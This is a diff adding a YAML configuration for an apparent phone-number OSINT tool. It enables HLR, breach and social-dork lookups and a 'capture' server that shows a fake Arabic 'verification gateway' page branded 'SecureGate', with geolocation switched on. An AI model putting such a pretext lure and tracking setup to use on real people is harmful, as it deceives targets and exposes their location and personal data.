@@ -1,0 +1,35 @@
+http:
+  timeout: 12.0
+  retries: 2
+  backoff: 0.8
+  proxy: null
+  verify_tls: true
+
+capture:
+  host: 0.0.0.0
+  port: 8088
+  public_base: http://127.0.0.1:8088
+  db_path: data/phonex.db
+  dashboard_token: change-me-please
+  session_ttl: 86400
+  geolocation: true
+  pretext_title: "بوابة التحقق الموحّدة"
+  pretext_subtitle: "جارٍ التحقق من هوية الرابط وصلاحية الجلسة"
+  brand: "SecureGate"
+
+providers:
+  enabled:
+    - number_meta
+    - mccmnc
+    - messaging
+    - social_dorks
+    - hlr
+    - breach
+  timeout: 20.0
+  concurrency: 6
+
+output:
+  dir: out
+  formats: [json, md, html]
+
+default_region: IQ
